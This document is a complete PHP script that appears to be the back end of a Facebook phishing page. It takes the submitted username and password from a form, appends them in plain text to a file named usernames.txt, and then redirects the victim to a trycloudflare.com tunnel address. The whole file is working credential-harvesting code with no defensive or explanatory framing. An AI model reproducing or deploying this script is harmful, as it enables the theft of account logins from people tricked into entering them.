<?php

file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://jimmy-playing-den-laws.trycloudflare.com');
exit();
?>